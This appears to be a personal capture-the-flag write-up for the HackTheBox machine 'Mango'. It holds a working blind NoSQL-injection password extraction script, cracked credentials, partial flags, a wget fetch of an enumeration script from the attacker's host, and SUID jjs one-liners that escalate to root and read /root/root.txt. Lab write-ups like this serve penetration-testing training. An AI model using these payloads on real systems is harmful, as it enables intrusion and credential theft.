Mango - Linux

# Machine Details:

**IP Address :** 10.10.10.162
## Flags:
User: 79bf31c6
Root: 8a8ef79a

## Hints:
Name of the Machine - might be related to MongoDB.
SSL certificates


# Take Away
* Inspect the HTTPs website - certificates
* Make a habit of registering the hostnames locally.
* Look more into the home folder of the user, likely contains some hint

# Recon:
## nmap
scan command: `nmap -p- `
```
scan results
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)      
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))  
443

```

## Web Page found:
Https has some unknown certificate: https://10.10.10.162/

It talks about staging-order.mango.htb, added this as an hostname to /etc/hosts

Voila, there is an webpage (which was previously not present) in the http:// and not https:// webpage.

http://staging-order.mango.htb/

Has a log in screen, might be related to Mongo DB.


# Foothold :
For the login web page, Trying to use: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
the python script gives erroneous results.

The python script from https://book.hacktricks.xyz/pentesting-web/nosql-injection Gave proper output :)

## Script Used:
Notice: I guessed the name admin as the username from the certificate, and mango since the name of the machine is mango. :) - if it fails will enumerate the username as well.
```python
import requests
import string

url = "http://staging-order.mango.htb"
headers = {"Host": "staging-order.mango.htb"}
cookies = {"PHPSESSID": "k90e8p8k65a6b0b1rgbck1tutk"}
possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]
def get_password(username):
    print("Extracting password of "+username)
    params = {"username":username, "password[$regex]":"", "login": "login"}
    password = "^"
    while True:
        for c in possible_chars:
            params["password[$regex]"] = password + c + ".*"
            pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
            if int(pr.status_code) == 302:
                print("pass",c)
                password += c
                break
        if c == possible_chars[-1]:
            print("Found password "+password[1:].replace("\\", "")+" for username "+username)
            return password[1:].replace("\\", "")

def get_usernames():
    usernames = []
    params = {"username[$regex]":"", "password[$regex]":".*", "login": "login"}
    for c in possible_chars:
        username = "^" + c
        params["username[$regex]"] = username + ".*"
        pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
        if int(pr.status_code) == 302:
            print("Found username starting with "+c)
            while True:
                for c2 in possible_chars:
                    params["username[$regex]"] = username + c2 + ".*"
                    if int(requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False).status_code) == 302:
                        username += c2
                        print(username)
                        break

                if c2 == possible_chars[-1]:
                    print("Found username: "+username[1:])
                    usernames.append(username[1:])
                    break
    return usernames

usernames = ["admin","mango"]
for u in usernames:
    get_password(u)

```

Was able to find the passwords:
```
admin : t9KcS3>!0B#2
mango : h3mXK8RhU~f{]f5H
```

Screen-Shot of the script output.

![f4bc96690381ae8e708dfd9567e1a274.png](../../_resources/75f312370d134f34bd6500062a08d5f5.png)


Logging into the website gave:

![38e6dd193b053e4ddcbe00572afa2b08.png](../../_resources/e593df41839d40feb9c2276e464bc6ef.png)

# User:

SSH into the box with the previous passwords:
admin - fails
mango - works :)

```
su admin
cat /home/admin/user.txt
79bf31c6c6
```

# Priv Esc:

su admin
password is the one found above.


# Root:

Checked a bunch of stuffs did not help corntab looks to be running. Might come back to this latter.

Will try to run the LinuxEnum Script.

```
Attacker Machine:
cd /root/HTB/LOCAL/LinEnum
python -m SimpleHTTPServer 8080

Target Machine:
wget http://10.10.15.72:8080/LinEnum.sh
```
Interesting Findings:
```


[+] Possibly interesting SGID files:
-rwsr-sr-- 1 root admin 10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs

[+] Possibly interesting SUID files:                                              
-rwsr-sr-- 1 root admin 10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs      
```

Lets try:
```
echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs

This Freezes but we see #

echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc ls /root/').waitFor()" | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs

Did not work :(

sh -c 'cp $(which jjs) .; chmod +s ./jjs'
echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh id').waitFor()" | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs

echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p cat /root/root.txt').waitFor()" | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs

Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh id').waitFor()
Java.type('java.lang.Runtime').getRuntime().exec('ls -la /root/').waitFor()
```

looked more into the home folder of the user.

```
ls -la /home/admin
found a file for jjs history; found this code snippet..

var BufferedReader = Java.type("java.io.BufferedReader");
var FileReader = Java.type("java.io.FileReader");
var br = new BufferedReader(new FileReader("/root/root.txt"));
while ((line = br.readLine()) != null) { print(line); }

```

Works :)
Owned the Root.
